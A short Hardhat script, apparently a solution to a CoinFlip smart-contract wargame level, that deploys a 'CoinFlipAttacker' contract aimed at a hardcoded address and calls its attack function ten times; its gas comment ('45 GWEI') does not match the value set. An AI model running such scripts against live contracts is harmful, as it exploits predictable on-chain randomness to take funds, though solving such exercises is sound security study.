const { ethers } = require("hardhat");


const ATTACKER_NAME = "CoinFlipAttacker";
const coinContract="0x2E79a8036d8D0D78f33031ac387348BA747599A4"


async function main() {

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(coinContract);
  await attackerContract.deployed();

  for (let i = 1; i <= 10; i++) {
    console.log(`Performing attack #${i}...`);
    const tx = await attackerContract.attack({gasPrice: 450000000000}); // 45 GWEI
    await tx.wait(1);
  }
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});